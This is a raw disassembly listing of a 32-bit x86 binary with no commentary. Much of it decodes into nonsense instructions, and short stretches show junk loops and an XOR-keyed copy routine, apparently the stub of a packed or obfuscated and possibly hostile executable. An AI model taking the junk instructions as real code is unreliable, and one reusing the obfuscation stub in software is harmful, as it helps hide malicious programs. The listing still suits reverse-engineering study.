  40298e:	test   al,0x72
  402990:	or     DWORD PTR [eax-0x76da8ec6],edi
  402996:	sbb    eax,0x94e258e3
  40299b:	push   0x32b61abc
  4029a0:	daa    
  4029a1:	mov    ebx,0xf1afd0c3
  4029a6:	fs enter 0x3675,0x8e
  4029ab:	xchg   edx,eax
  4029ac:	or     eax,0x34a3b49b
  4029b1:	cmp    ah,al
  4029b3:	sbb    eax,0x3891d9ac
  4029b8:	pop    esp
  4029b9:	mov    edx,0x60c8c8fe
  4029be:	pop    esp
  4029bf:	sub    BYTE PTR [ebx+0x20],0x7e
  4029c3:	cdq    
  4029c4:	leave  
  4029c5:	mov    al,ds:0x4d99c4da
  4029ca:	mov    al,0x61
  4029cc:	loope  0x402a01
  4029ce:	dec    esi
  4029cf:	mov    ebx,gs
  4029d1:	sbb    eax,0x55d7e1ea
  4029d6:	xchg   edx,eax
  4029d7:	je     0x402a1a
  4029d9:	mov    eax,0x530ab555
  4029de:	jmp    0x4703:0x15c0efee
  4029e5:	lods   eax,DWORD PTR ds:[esi]
  4029e6:	cmp    ecx,esp
  4029e8:	sbb    ecx,DWORD PTR [eax+0x24]
  4029eb:	push   cs
  4029ec:	loope  0x402a16
  4029ee:	fcmove st,st(7)
  4029f0:	mov    esi,0xec36f927
  4029f5:	xor    ebp,DWORD PTR [esi-0x7d75b8e2]
  4029fb:	sar    BYTE PTR [eax-0x50],cl
  4029fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4029ff:	push   0xf9000d67
  402a04:	push   cs
  402a05:	outs   dx,BYTE PTR ds:[esi]
  402a06:	pop    esi
  402a07:	daa    
  402a08:	gs adc al,0x7b
  402a0b:	cmp    dl,BYTE PTR [eax]
  402a0d:	test   eax,0x33107d03
  402a12:	rol    DWORD PTR [ebx],1
  402a14:	(bad)  
  402a15:	cmp    edx,edi
  402a17:	ja     0x402e5d
  402a1d:	push   ebx
  402a1e:	jmp    0x402a28
  402a23:	mov    esi,0x32729b
  402a28:	mov    eax,DWORD PTR [ebp-0x8]
  402a2b:	mov    edi,DWORD PTR [ebp-0x4]
  402a2e:	jmp    0x402c26
  402a33:	lock ss inc eax
  402a36:	xor    al,0x40
  402a38:	jo     0x402aaa
  402a3a:	repnz push ss
  402a3c:	pop    ds
  402a3d:	mov    ds:0x6c2e7180,al
  402a42:	(bad)
  402a46:	jle    0x402a9d
  402a48:	jg     0x402ac8
  402a4a:	jle    0x402abe
  402a4c:	sub    BYTE PTR [edx+ebx*8],0x2e
  402a50:	aam    0x20
  402a52:	mov    fs,WORD PTR [ecx]
  402a54:	cwde   
  402a55:	lahf   
  402a56:	dec    eax
  402a57:	dec    esi
  402a58:	jge    0x402a9b
  402a5a:	mov    edi,0x3992d2cc
  402a5f:	inc    ebp
  402a60:	or     ecx,esi
  402a62:	fwait
  402a63:	mov    eax,ds:0x744f4410
  402a68:	adc    DWORD PTR [ebx+0x2c],ebx
  402a6b:	mov    ?,WORD PTR [ebx+ebx*1-0x4dfbafbc]
  402a72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a73:	sub    esi,DWORD PTR [esi]
  402a75:	shr    bh,0x13
  402a78:	add    eax,0x1cd221aa
  402a7d:	cmp    dh,BYTE PTR [ebp-0x134b0172]
  402a83:	dec    edx
  402a84:	sar    DWORD PTR [ecx-0x7cf0708c],0x33
  402a8b:	pop    ecx
  402a8c:	push   cs
  402a8d:	gs sub ebx,ecx
  402a90:	mov    bh,0x6b
  402a92:	das    
  402a93:	ss dec edi
  402a95:	fcom   DWORD PTR [edi]
  402a97:	xchg   edx,eax
  402a98:	mov    al,0x34
  402a9a:	clc    
  402a9b:	lds    edi,FWORD PTR [ecx-0x1c]
  402a9e:	ret    0x10ce
  402aa1:	std    
  402aa2:	xchg   si,ax
  402aa4:	lods   eax,DWORD PTR ds:[esi]
  402aa5:	or     eax,0x4280c49c
  402aaa:	pop    esp
  402aab:	push   eax
  402aac:	or     BYTE PTR [edx+0x761950b8],bl
  402ab2:	pop    ds
  402ab3:	sbb    eax,0xc57cbeed
  402ab8:	icebp  
  402ab9:	mov    dl,0x81
  402abb:	popa   
  402abc:	jmp    0x560c2b32
  402ac1:	cwde   
  402ac2:	sbb    al,0x20
  402ac4:	pop    ebp
  402ac5:	jnp    0x402ac9
  402ac7:	jp     0x402b31
  402ac9:	and    dl,BYTE PTR [ebx+esi*1+0x40bd421b]
  402ad0:	pop    esp
  402ad1:	cmp    BYTE PTR [eax-0x3779c81],ah
  402ad7:	in     al,0xe5
  402ad9:	sahf   
  402ada:	mov    edi,0x87b2660a
  402adf:	sbb    ecx,DWORD PTR [esi+0x5471a473]
  402ae5:	adc    dl,0x5c
  402ae8:	int3   
  402ae9:	fsub   DWORD PTR [edi+0x1e]
  402aec:	mov    dl,0x8e
  402aee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402aef:	rol    BYTE PTR [esi+0x7a7b1d88],0x29
  402af6:	sbb    dh,ah
  402af8:	jo     0x402b44
  402afa:	pop    ss
  402afb:	xor    ch,BYTE PTR [ebp+0x68]
  402afe:	out    dx,eax
  402aff:	jnp    0x402ad7
  402b01:	js     0x402b28
  402b03:	lahf   
  402b04:	add    BYTE PTR [edi],cl
  402b06:	sub    DWORD PTR [ebx+0x7d8ed67f],eax
  402b0c:	fs jo  0x402ac7
  402b0f:	imul   edi,DWORD PTR [ecx+eiz*1-0x690e821b],0xe0e605a2
  402b1a:	repz sbb bl,BYTE PTR [esi]
  402b1d:	jmp    0xe2427d88
  402b22:	lock inc edx
  402b24:	mov    ecx,0x92b13215
  402b29:	xchg   ebx,eax
  402b2a:	xchg   edx,eax
  402b2b:	mov    eax,ds:0x5d39a9d
  402b30:	lock adc eax,0xbe6550a2
  402b36:	cli    
  402b37:	int    0xd6
  402b39:	ds jns 0x402b33
  402b3c:	mov    al,al
  402b3e:	pop    eax
  402b3f:	pusha  
  402b40:	ret    0x9b6a
  402b43:	(bad)  [edx+ecx*2+0x46b504d]
  402b4a:	mov    esp,0xcf4bb3e9
  402b4f:	out    0x18,al
  402b51:	ins    BYTE PTR es:[edi],dx
  402b52:	adc    ecx,DWORD PTR [ebx-0x2]
  402b55:	xchg   ebx,eax
  402b56:	stc    
  402b57:	and    al,0x64
  402b59:	fmulp  st(5),st
  402b5b:	pop    edi
  402b5c:	inc    ebx
  402b5d:	and    ecx,esi
  402b5f:	jne    0x402ba5
  402b61:	push   edi
  402b62:	mov    edi,0x15d8caa6
  402b67:	mov    al,ds:0x58a7059e
  402b6c:	stos   BYTE PTR es:[edi],al
  402b6d:	adc    ch,bh
  402b6f:	aad    0x4b
  402b71:	cmp    al,0x55
  402b73:	imul   eax,DWORD PTR [esi],0xffffff94
  402b76:	mov    al,ds:0x9b1662d5
  402b7b:	jge    0x402bcd
  402b7d:	xor    al,0x47
  402b7f:	mov    ecx,0x568439c7
  402b84:	test   al,0x6a
  402b86:	aaa    
  402b87:	inc    edi
  402b88:	jp     0x402bea
  402b8a:	mov    dl,0x84
  402b8c:	push   edx
  402b8d:	lds    edi,FWORD PTR [ecx+0x20]
  402b90:	sub    DWORD PTR [edi+esi*1+0x845908],ebx
  402b97:	loope  0x402bb9
  402b99:	arpl   ax,sp
  402b9b:	out    0x53,al
  402b9d:	punpckldq mm5,mm2
  402ba0:	jnp    0x402b2d
  402ba2:	dec    ebp
  402ba3:	add    ebx,ebp
  402ba5:	popf   
  402ba6:	sub    DWORD PTR [ebx+0x3a],esi
  402ba9:	cmp    eax,0x1d27d1d1
  402bae:	ror    BYTE PTR [esi*4+0x5d3f89cf],cl
  402bb5:	pop    edi
  402bb6:	jno    0x402b54
  402bb8:	sub    al,0x9d
  402bba:	inc    ecx
  402bbb:	int    0x29
  402bbd:	ins    BYTE PTR es:[edi],dx
  402bbe:	cmp    BYTE PTR [edi+ecx*1-0x30],al
  402bc2:	test   DWORD PTR [edx-0x55225683],edi
  402bc8:	xlat   BYTE PTR ds:[ebx]
  402bc9:	mov    bl,0x9a
  402bcb:	in     al,dx
  402bcc:	mov    ss,WORD PTR [edx-0x1b]
  402bcf:	inc    edi
  402bd0:	sbb    BYTE PTR [esi-0x2d],0xc9
  402bd4:	lock shl BYTE PTR [esi],0x3f
  402bd8:	aas    
  402bd9:	cmc    
  402bda:	je     0x402b5d
  402bdc:	jno    0x402bec
  402bde:	stos   DWORD PTR es:[edi],eax
  402bdf:	and    BYTE PTR [eax+ebp*1],bl
  402be2:	or     DWORD PTR [ecx+ebx*8+0x379eeb62],0xe40c1886
  402bed:	sbb    ebx,DWORD PTR [edx+ebx*4-0x55c6d961]
  402bf4:	inc    ecx
  402bf5:	add    BYTE PTR [eax],0x59
  402bf8:	jmp    0x4451:0xa1603ec5
  402bff:	xchg   ecx,eax
  402c00:	push   ebx
  402c01:	pop    ss
  402c02:	shl    ebp,cl
  402c04:	jle    0x402c4c
  402c06:	xchg   ecx,eax
  402c07:	or     edi,ecx
  402c09:	sub    al,0xa0
  402c0b:	push   ecx
  402c0c:	shl    BYTE PTR [edi],1
  402c0e:	in     al,0x16
  402c10:	adc    ch,BYTE PTR [ecx+0x3f225784]
  402c16:	pop    edi
  402c17:	mov    cl,0xea
  402c19:	fimul  DWORD PTR ss:[edi-0x1ac987b0]
  402c20:	es cdq 
  402c22:	imul   BYTE PTR [ebx]
  402c24:	mov    ecx,0x3f933dd
  402c29:	dec    BYTE PTR [ebx-0x50f0f78b]
  402c2f:	cli    
  402c30:	mov    ebx,DWORD PTR [ebp+0xc]
  402c33:	xor    eax,ecx
  402c35:	add    eax,edx
  402c37:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  402c3e:	mov    BYTE PTR [edi+esi*1],al
  402c41:	mov    eax,DWORD PTR [ebp-0x4]
  402c44:	xor    eax,ecx
  402c46:	lea    edx,[edx+eax*1+0x32729b]
  402c4d:	mov    eax,DWORD PTR [ebp-0x4]
  402c50:	xor    eax,ecx
  402c52:	mov    esi,0xffcd8d65
  402c57:	sub    esi,eax
  402c59:	jmp    0x402e51
  402c5e:	outs   dx,BYTE PTR ds:[esi]
  402c5f:	add    ebx,DWORD PTR [edi+0x6f72734e]
  402c65:	and    ebp,DWORD PTR [esi]
  402c67:	add    al,0x68
  402c69:	mov    dh,0x21
  402c6b:	iret   
  402c6c:	jge    0x402ce0
  402c6e:	dec    edi
  402c6f:	or     bh,BYTE PTR [esi+0x7e]
  402c72:	push   ebp
  402c73:	jg     0x402cf3
  402c75:	jle    0x402cce
  402c77:	pop    ebp
  402c78:	adc    eax,0x61c0cf59
  402c7d:	inc    ebx
  402c7e:	mov    cs,WORD PTR [ecx]
  402c80:	xchg   esi,eax
  402c81:	dec    edi
  402c82:	loopne 0x402c82
  402c84:	mov    dh,0xce
  402c86:	icebp  
  402c87:	jmp    0x5dba:0x196b4bb
  402c8e:	lahf   
  402c8f:	sub    al,0xd3
  402c91:	rcl    BYTE PTR [ebx],cl
  402c93:	ins    BYTE PTR es:[edi],dx
  402c94:	enter  0xc3fb,0xdc
  402c98:	je     0x402ce6
  402c9a:	inc    edi
  402c9b:	stos   BYTE PTR es:[edi],al
  402c9c:	xchg   esi,eax
  402c9d:	xlat   BYTE PTR ds:[ebx]
  402c9e:	mov    eax,ds:0xd5dc82f9
  402ca3:	arpl   WORD PTR [eax+0x7e],dx
  402ca6:	call   0x47bb:0x7e22f417
  402cad:	(bad)  
  402caf:	pop    eax
  402cb0:	or     al,0x66
  402cb2:	push   es
  402cb3:	imul   BYTE PTR [ecx-0x13c52c08]
  402cb9:	fisttp QWORD PTR [ecx+0x7d]
  402cbc:	(bad)  
  402cbd:	aaa    
  402cbe:	jl     0x402c87
  402cc0:	leave  
  402cc1:	retf   0x34f7
  402cc4:	lock push ss
  402cc6:	enter  0x3f44,0xbc
  402cca:	inc    eax
  402ccb:	test   BYTE PTR [edi+edi*8],dl
  402cce:	add    BYTE PTR [eax+eiz*4-0x2d],al
  402cd2:	sub    eax,0x921e51c5
  402cd7:	iret   
  402cd8:	sub    eax,0xe9aefc72
  402cdd:	imul   ebx,DWORD PTR [esi+0x69],0x83561057
  402ce4:	mov    ds:0x345491be,eax
  402ce9:	cs fcmovnu st,st(7)
  402cec:	cdq    
  402ced:	mov    cl,0xc1
  402cef:	outs   dx,BYTE PTR ds:[esi]
  402cf0:	mov    ds:0xa6033bd3,eax
  402cf5:	jmp    0x6329db7b
  402cfa:	pop    esp
  402cfb:	or     eax,0xa7024b18
  402d00:	push   es
  402d01:	aam    0xc1
  402d03:	sbb    edx,DWORD PTR [ebp+0x7f]
  402d06:	lock mov eax,ds:0x1784f250
  402d0c:	xlat   BYTE PTR ds:[ebx]
  402d0d:	and    al,0xd0
  402d0f:	ret    0xf17b
  402d12:	dec    edi
  402d13:	inc    ebp
  402d14:	jb     0x402d83
  402d16:	adc    BYTE PTR [edx+ecx*8-0x72],ah
  402d1a:	jb     0x402cad
  402d1c:	sbb    al,0x12
  402d1e:	push   0xffffff96
  402d20:	ss mov edx,0x6ffbebba
  402d26:	cmp    eax,0x5a4eef22
  402d2b:	call   0x95bf7e63
  402d30:	ja     0x402cfa
  402d32:	mov    eax,0x3ed9061c
  402d37:	or     DWORD PTR [ebp+0xffabcfa],edx
  402d3d:	add    al,0x1b
  402d3f:	fstp   TBYTE PTR [edi]
  402d41:	icebp  
  402d42:	dec    ebp
  402d43:	imul   ecx,eax,0x34
  402d46:	dec    esp
  402d47:	push   esi
  402d48:	jno    0x402d2a
  402d4a:	sbb    ecx,DWORD PTR [edi]
  402d4c:	loopne 0x402d2a
  402d4e:	loopne 0x402d79
  402d50:	cmp    al,0x73
  402d52:	mov    eax,0x5accdaf9
  402d57:	ret    
  402d58:	(bad)  
  402d59:	(bad)  
  402d5a:	fcomip st,st(6)
  402d5c:	js     0x402db5
  402d5e:	lock popaw 
  402d61:	test   bh,0xc1
  402d64:	fidiv  WORD PTR [eax+0x14]
  402d67:	mov    ds:0xe2464ef3,al
  402d6c:	sub    eax,0x3dbb5237
  402d71:	cmp    DWORD PTR [ebx+edx*8],ebp
  402d74:	push   eax
  402d75:	pop    edx
  402d76:	cmp    eax,DWORD PTR [esi-0x26]
  402d79:	add    eax,0x978bce73
  402d7e:	outs   dx,DWORD PTR ds:[esi]
  402d7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d80:	cmp    al,0xe8
  402d82:	dec    ecx
  402d83:	cs in  eax,0x2d
  402d86:	lods   al,BYTE PTR ds:[esi]
  402d87:	push   ecx
  402d88:	fdiv   QWORD PTR [ebp+ebx*8+0x77]
  402d8c:	or     DWORD PTR [edx+0x58dde86e],esi
  402d92:	div    DWORD PTR [ecx-0x29]
  402d95:	xor    ecx,DWORD PTR [eax+0x3cdb024a]
  402d9b:	aam    0xce
  402d9d:	jle    0x402d20
  402d9f:	dec    edi
  402da0:	ss in  eax,dx
  402da2:	wbinvd 
  402da4:	mov    WORD PTR [eax-0x540d7fa0],ss
  402daa:	in     al,0xb0
  402dac:	mov    dh,0x72
  402dae:	scas   eax,DWORD PTR es:[edi]
  402daf:	bound  esp,QWORD PTR [eax]
  402db1:	in     eax,0xb0
  402db3:	pop    ebp
  402db4:	pushf  
  402db5:	push   ss
  402db6:	repz test DWORD PTR [esp+ebp*1+0x2e9c296],eax
  402dbe:	mov    edi,DWORD PTR ds:0x5954d8c6
  402dc4:	add    BYTE PTR ds:0x438b76de,ch
  402dca:	pop    es
  402dcb:	jmp    0xd7f:0x8c3cac8d
  402dd2:	(bad)  
  402dd3:	cmp    al,0x1e
  402dd5:	push   edx
  402dd6:	call   0xa37:0xe9876400
  402ddd:	test   DWORD PTR [edx],0xe68f4e61
  402de3:	xlat   BYTE PTR ds:[ebx]
  402de4:	xor    edi,DWORD PTR [edi]
  402de6:	(bad)  
  402de8:	scas   eax,DWORD PTR es:[edi]
  402de9:	cmp    DWORD PTR [esi+0x1736a275],edi
  402def:	mul    esi
  402df1:	cmp    esi,0x83311562
  402df7:	scas   al,BYTE PTR es:[edi]
  402df8:	mov    BYTE PTR [ecx+0x6f],cl
  402dfb:	or     DWORD PTR ds:0x2eaa75f4,esp
  402e01:	leave  
  402e02:	mov    edi,0x76432868
  402e07:	mov    edx,0xf908518e
  402e0c:	jmp    0x402e12
  402e0e:	sbb    al,0xae
  402e10:	mov    edi,0xbe72bc35
  402e15:	shr    BYTE PTR [ecx-0x39],cl
  402e18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e19:	jno    0x402dcd
  402e1b:	int    0x52
  402e1d:	add    eax,ecx
  402e1f:	imul   edi,esi,0x4b
  402e22:	loope  0x402e18
  402e24:	push   es
  402e25:	mov    ds:0x920c4497,al
  402e2a:	jle    0x402e3c
  402e2c:	leave  
  402e2d:	xor    al,0x65
  402e2f:	call   0x415f:0xa20b0bcf
  402e36:	inc    ebp
  402e37:	push   edi
  402e38:	sahf   
  402e39:	inc    esp
  402e3a:	mov    esp,0x6362d65a
  402e3f:	aas    
  402e40:	loopne 0x402ea4
  402e42:	push   cs
  402e43:	arpl   WORD PTR [ecx],sp
  402e45:	stc    
  402e46:	mov    eax,DWORD PTR [esi-0x4b]
  402e49:	icebp  
  402e4a:	mov    cl,0x78
  402e4c:	jnp    0x402ec9
  402e4e:	mul    cl
  402e50:	mov    bl,0x3
  402e52:	jne    0x402e64
  402e54:	cmp    edx,esi
  402e56:	jbe    0x402a23
  402e5c:	pop    ebx
  402e5d:	mov    eax,0xf89c8532
  402e62:	pop    edi
  402e63:	pop    esi
  402e64:	leave  
  402e65:	ret    0xc
  402e68:	push   ebp
  402e69:	mov    ebp,esp
  402e6b:	sub    esp,0x58
  402e6e:	mov    ecx,DWORD PTR [ebp+0x8]
  402e71:	mov    eax,0x8a3c
  402e76:	xor    ax,WORD PTR [ecx+0x20]
  402e7a:	mov    ecx,0x3b02
  402e7f:	add    ax,cx
  402e82:	or     DWORD PTR ds:0x42e650,edi
  402e88:	movzx  eax,ax
  402e8b:	mov    ecx,DWORD PTR ds:0x4302b5
  402e91:	xor    ecx,DWORD PTR ds:0x42ec53
  402e97:	mov    DWORD PTR ds:0x4302b5,ecx
  402e9d:	mov    DWORD PTR [ebp-0xc],eax
  402ea0:	mov    BYTE PTR [ebp-0x1],0x7f
  402ea4:	sub    ecx,0x18d2
  402eaa:	lea    eax,[ebp-0x1]
  402ead:	and    DWORD PTR ds:0x42ec6f,0x0
  402eb7:	jmp    0x402ec9
  402ebc:	mov    ecx,DWORD PTR ds:0x42ec6f
  402ec2:	inc    ecx
  402ec3:	mov    DWORD PTR ds:0x42ec6f,ecx
  402ec9:	cmp    DWORD PTR ds:0x42ec6f,0x18
  402ed0:	jae    0x402fa2
  402ed6:	cmp    DWORD PTR ds:0x42ec6f,0x1a
  402edd:	jne    0x402eee
  402ee3:	push   0x2d42
  402ee8:	call   DWORD PTR ds:0x42e91b
  402eee:	jmp    0x402ebc
  402ef3:	mov    DWORD PTR ds:0x42ec67,0x17
  402efd:	cmp    DWORD PTR ds:0x42ec67,0x0
  402f04:	je     0x402fa2
  402f0a:	cmp    DWORD PTR ds:0x42ec67,0x7
  402f11:	jne    0x402f2c
  402f17:	push   0x25f8
  402f1c:	push   0x4302c9
  402f21:	push   0x42e737
  402f26:	call   DWORD PTR ds:0x42e833
  402f2c:	cmp    DWORD PTR ds:0x42ec67,0x8
  402f33:	jne    0x402f48
  402f39:	xor    ecx,ecx
  402f3b:	or     ecx,DWORD PTR ds:0x42ec67
  402f41:	dec    ecx
  402f42:	mov    DWORD PTR ds:0x42ec67,ecx
  402f48:	mov    ecx,DWORD PTR ds:0x42ec67
  402f4e:	dec    ecx
  402f4f:	mov    DWORD PTR ds:0x42ec67,ecx
  402f55:	jmp    0x402efd
  402f5a:	and    DWORD PTR ds:0x42ec4f,0x0
  402f64:	mov    ecx,DWORD PTR ds:0x42ec4f
  402f6a:	inc    ecx
  402f6b:	mov    DWORD PTR ds:0x42ec4f,ecx
  402f71:	cmp    DWORD PTR ds:0x42ec4f,0x16
  402f78:	jne    0x402f8f
  402f7e:	push   DWORD PTR [ebp-0xc]
  402f81:	push   0x4302ed
  402f86:	push   DWORD PTR [ebp-0x24]
  402f89:	call   DWORD PTR ds:0x42e847
  402f8f:	cmp    DWORD PTR ds:0x42ec4f,0x10
  402f96:	jb     0x402f64
  402f9c:	add    DWORD PTR ds:0x42ec4b,ebx
  402fa2:	mov    DWORD PTR [ebp-0x10],eax
  402fa5:	mov    DWORD PTR ds:0x4302d5,0x10
  402faf:	cmp    DWORD PTR ds:0x4302d5,0x0
  402fb6:	je     0x403010
  402fbc:	cmp    DWORD PTR ds:0x4302d5,0x4
  402fc3:	jne    0x402fda
  402fc9:	push   DWORD PTR [ebp-0x1c]
  402fcc:	push   DWORD PTR [ebp-0x20]
  402fcf:	push   0x42e6ad
  402fd4:	call   DWORD PTR ds:0x42e84b
  402fda:	cmp    DWORD PTR ds:0x4302d5,0x5
  402fe1:	jne    0x402ff4
  402fe7:	mov    ecx,DWORD PTR ds:0x4302d5
  402fed:	dec    ecx
  402fee:	mov    DWORD PTR ds:0x4302d5,ecx
  402ff4:	mov    ecx,DWORD PTR ds:0x4302d5
  402ffa:	dec    ecx
  402ffb:	mov    DWORD PTR ds:0x4302d5,ecx
  403001:	jmp    0x402faf
  403006:	and    DWORD PTR ds:0x4302ed,0x3a0f
  403010:	mov    al,BYTE PTR [ebp-0x1]
  403013:	mov    ecx,DWORD PTR ds:0x42e640
  403019:	add    DWORD PTR ds:0x42ec73,ecx
  40301f:	mov    ecx,DWORD PTR [ebp-0x10]
  403022:	mov    DWORD PTR ds:0x43035b,0x1b71
  40302c:	xor    al,0x46
  40302e:	sub    al,0x38
  403030:	or     DWORD PTR ds:0x42e648,0x7677
  40303a:	mov    BYTE PTR [ecx],al
  40303c:	not    eax
  40303e:	jmp    0x40320b
  403043:	loop   0x40305e
  403045:	fcom   DWORD PTR [ebp+0x697355e1]
  40304b:	popf   
  40304c:	mov    DWORD PTR [ecx-0x48],ebp
  40304f:	push   cs
  403050:	jmp    0x8e2aa4b
  403055:	jle    0x4030d5
  403057:	scas   al,BYTE PTR es:[edi]
  403058:	jg     0x4030d8
  40305a:	jle    0x402ff7
  40305c:	call   0x9eb4:0x9c4f5c16
  403063:	jne    0x403062
  403065:	cmp    al,0xa1
  403067:	cmp    eax,0x72442e7c
  40306c:	call   0x127ca66
  403071:	cmp    ah,BYTE PTR [ebx+0x27]
  403074:	pop    esi
  403075:	call   0x566a8e3
  40307a:	icebp  
  40307b:	cmp    BYTE PTR [ebp+0x7ebec82e],bl
  403081:	in     eax,dx
  403082:	and    esp,DWORD PTR [esi-0x4e9f10df]
  403088:	mov    edi,0x83ef7bb5
  40308d:	jb     0x403052
  40308f:	or     DWORD PTR [edi],0xffffffd6
  403092:	and    DWORD PTR [ebp-0x50b3a767],edx
  403098:	nop
  403099:	int3   
  40309a:	or     dh,ah
  40309c:	push   esi
  40309d:	jno    0x40309b
  40309f:	enter  0x919a,0x2d
  4030a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030a4:	loope  0x40304c
  4030a6:	js     0x4030d6
  4030a8:	xchg   edi,eax
  4030a9:	imul   esi,DWORD PTR [eax],0xa758ec69
  4030af:	dec    eax
  4030b0:	loope  0x4030c2
  4030b2:	jmp    0xad5f:0xadd0c1f9
  4030b9:	mov    ecx,0x572d6e92
  4030be:	pop    esi
  4030bf:	loop   0x4030b3
  4030c1:	jmp    0x4030ea
  4030c3:	fdivr  st,st(0)
  4030c5:	in     al,dx
  4030c6:	mov    dl,0xa2
  4030c8:	arpl   WORD PTR [ebx+eax*1+0x77fdb824],dx
  4030cf:	or     DWORD PTR ds:0xa9dc51ba,ebp
  4030d5:	push   eax
  4030d6:	test   DWORD PTR [esi+ebx*2+0x51],ebx
  4030da:	imul   esp,edi,0xf8eba568
  4030e0:	inc    esp
  4030e1:	ret    
  4030e2:	xchg   edi,eax
  4030e3:	aas    
  4030e4:	(bad)  
  4030e5:	fnstenv [edi+ebp*2-0x4f]
  4030e9:	jmp    0x403117
  4030eb:	push   ds
  4030ec:	int    0xe0
  4030ee:	lock sbb al,0xd1
  4030f1:	dec    esp
  4030f2:	fisub  DWORD PTR [esp+ebp*2+0x231c1ac6]
  4030f9:	repz lea edi,ds:0x2223378a
  403100:	dec    esp
  403101:	sahf   
  403102:	neg    DWORD PTR [edi+eax*8]
  403105:	inc    eax
  403106:	cwde   
  403107:	idiv   BYTE PTR [edx+0x6e]
  40310a:	xchg   ecx,eax
  40310b:	xchg   BYTE PTR [edi],bh
  40310d:	mov    edi,ds
  40310f:	or     al,0xd1
  403111:	fdivr  QWORD PTR [eax+eiz*8+0x2f]
  403115:	jnp    0x4030c8
  403117:	gs jle 0x40315a
  40311a:	aad    0x73
  40311c:	sbb    eax,0x9c033045
  403121:	hlt    
  403122:	sahf   
  403123:	and    eax,0x89738f39
  403128:	sub    ch,ah
  40312a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40312b:	xchg   ecx,eax
  40312c:	popf   
  40312d:	and    bl,BYTE PTR [ebx-0x6b937cb1]
  403133:	mov    ecx,0xbb906054
  403138:	mov    ah,BYTE PTR [ecx+0x16]
  40313b:	mov    ds:0x2c28acf4,eax
  403140:	push   esp
  403141:	and    bh,BYTE PTR [esi]
  403143:	shl    DWORD PTR [edx+0x7400c67f],0x54
  40314a:	fistp  QWORD PTR [ebx-0x21]
  40314d:	pop    edx
  40314e:	les    edi,FWORD PTR [edx+0x6a]
  403151:	scas   al,BYTE PTR es:[edi]
  403152:	or     DWORD PTR [edi-0x43],edx
  403155:	in     eax,0x5a
  403157:	pop    esp
  403158:	xchg   ebx,eax
  403159:	pop    ebp
  40315a:	jb     0x4030ed
  40315c:	xchg   ecx,eax
  40315d:	pop    eax
  40315e:	lock and ah,dl
  403161:	fs pop ebx
  403163:	jns    0x403166
  403165:	pop    ss
  403166:	outs   dx,DWORD PTR ds:[esi]
  403167:	mov    bl,0x54
  403169:	jae    0x4030ee
  40316b:	mov    esp,0xb24e677d
  403170:	cli    
  403171:	ins    BYTE PTR es:[edi],dx
  403172:	xchg   edi,eax
  403173:	mov    ss,WORD PTR [esi-0xb8836fa]
  403179:	xor    BYTE PTR [ecx-0x20],ch
  40317c:	add    eax,0xa51520aa
  403181:	or     BYTE PTR [eax-0x73520080],dh
  403187:	and    al,BYTE PTR ds:0x9fc952d8
  40318d:	inc    edx
  40318e:	inc    edi
  40318f:	das    
  403190:	xor    al,BYTE PTR [ebp-0x30]
  403193:	cmp    eax,ebp
  403195:	repnz mov BYTE PTR [edx],bl
  403198:	sub    DWORD PTR fs:[esi],edx
  40319b:	lock jmp 0x73d3a736
  4031a1:	cmp    al,0x51
  4031a3:	sbb    eax,0x18d819f3
  4031a8:	lahf   
  4031a9:	cwde   
  4031aa:	ins    DWORD PTR es:[edi],dx
  4031ab:	pop    edi
  4031ac:	mov    al,ds:0x7cd64e71
  4031b1:	loopne 0x403224
  4031b3:	cmp    DWORD PTR [ebp-0x5518d4e],0xffffff9c
  4031ba:	(bad)  ds:0x9cac4695
  4031c0:	jg     0x4031d4
  4031c2:	inc    edi
  4031c3:	repnz xor DWORD PTR [ebp-0x58f6f43c],ebp
  4031ca:	mov    ebp,0xd08e8103
  4031cf:	test   DWORD PTR [edx],ebp
  4031d1:	adc    BYTE PTR [esp+esi*8+0x641e4ed],ch
  4031d8:	sahf   
  4031d9:	enter  0xa0ed,0xbc
  4031dd:	adc    BYTE PTR [esi],0xc2
  4031e0:	arpl   WORD PTR [eax],di
  4031e2:	or     al,0xfa
  4031e4:	jl     0x4031f3
  4031e6:	xor    ch,BYTE PTR [esi-0x34]
  4031e9:	inc    edi
  4031ea:	out    dx,al
  4031eb:	imul   ebp,DWORD PTR [edi],0xe6437dd9
  4031f1:	jbe    0x40321b
  4031f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031f4:	mov    ah,0xb9
  4031f6:	cld    
  4031f7:	mov    ss,WORD PTR [edx+0x31]
  4031fa:	mov    esp,0x2fd64274
  4031ff:	test   DWORD PTR [ecx-0x1e],ebp
  403202:	shl    BYTE PTR [esi+0x4c],cl
  403205:	cwde   
  403206:	push   edx
  403207:	shr    BYTE PTR [eax+ebp*2],0x53
  40320b:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  403212:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  403219:	or     DWORD PTR ds:0x42ec6f,ecx
  40321f:	mov    eax,DWORD PTR [ebp-0x8]
  403222:	movzx  ecx,WORD PTR ds:0x42ec4b
  403229:	adc    DWORD PTR ds:0x430357,ecx
  40322f:	mov    ecx,0x7510854
  403234:	sub    DWORD PTR ds:0x42e648,0x77ef
  40323e:	push   esi
  40323f:	xor    eax,ecx
  403241:	and    DWORD PTR ds:0x4302e1,0x33b1
  40324b:	jmp    0x403418
  403250:	inc    ecx
  403251:	jp     0x4031f4
  403253:	cs popa 
  403255:	mov    ch,0x51
  403257:	jno    0x403251
  403259:	(bad)  
  40325b:	pop    edi
  40325c:	jmp    0x7e16:0xd2296b95
  403263:	jle    0x403213
  403265:	jg     0x4032e5
  403267:	jle    0x403238
  403269:	or     eax,0xba97d349
  40326e:	daa    
  40326f:	imul   esp,DWORD PTR [ebx+0x76],0xffffffb1
  403273:	test   BYTE PTR [edx+0x8c846b],dl
  403279:	adc    BYTE PTR [ecx+0x7a],bh
  40327c:	(bad)  
  40327d:	fs mov al,0x41
  403280:	das    
  403281:	xchg   edi,eax
  403282:	cmc    
  403283:	(bad)  
  403284:	inc    esi
  403285:	stos   BYTE PTR es:[edi],al
  403286:	jno    0x4032e0
